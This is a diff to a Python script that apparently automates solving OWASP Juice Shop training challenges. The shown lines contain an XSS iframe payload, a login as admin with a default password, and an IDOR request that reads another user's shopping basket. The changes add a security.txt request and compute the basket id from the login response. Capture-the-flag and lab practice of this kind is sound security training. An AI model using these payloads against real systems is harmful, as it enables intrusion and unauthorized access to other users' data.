@@ -23,6 +23,8 @@ requests.get(url+'/rest/track-order/<iframe src="javascript:alert(`xss`)">')
 requests.post(url+'/api/Users/',data={'email':"aaaaaaa@juice-sh.op","password":"aaaaaaa","passwordRepeat":"aaaaaa","securityQuestion":{"id":6,"question":"Paternal grandmother's first name?","createdAt":"2020-01-16T14:58:58.420Z","updatedAt":"2020-01-16T14:58:58.420Z"},"securityAnswer":"aaaaaaa"})
 # ---- Score Board (Find the carefully hidden 'Score Board' page.)
 requests.get(url+'/assets/public/images/padding/1px.png')
+# ---- Security Policy (Behave like any "white-hat" should before getting into the action.)
+requests.get(url+'/.well-known/security.txt')
 
 # ==== No required action - Login challenges ====
 # ---- Ephemeral Accountant (Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.)
@@ -61,4 +63,4 @@ for i in range(11):
 with requests.session() as session:
 	login=loads(session.post(url+'/rest/user/login', data={'email':'admin@juice-sh.op','password':'admin123'}).text)['authentication']
 	# ---- View Basket (View another user's shopping basket.)
-	session.get(url+'/rest/basket/2',headers={'Authorization':'Bearer '+login['token']})
+	session.get(url+'/rest/basket/'+str(login['bid']+1), headers={'Authorization':'Bearer '+login['token']})
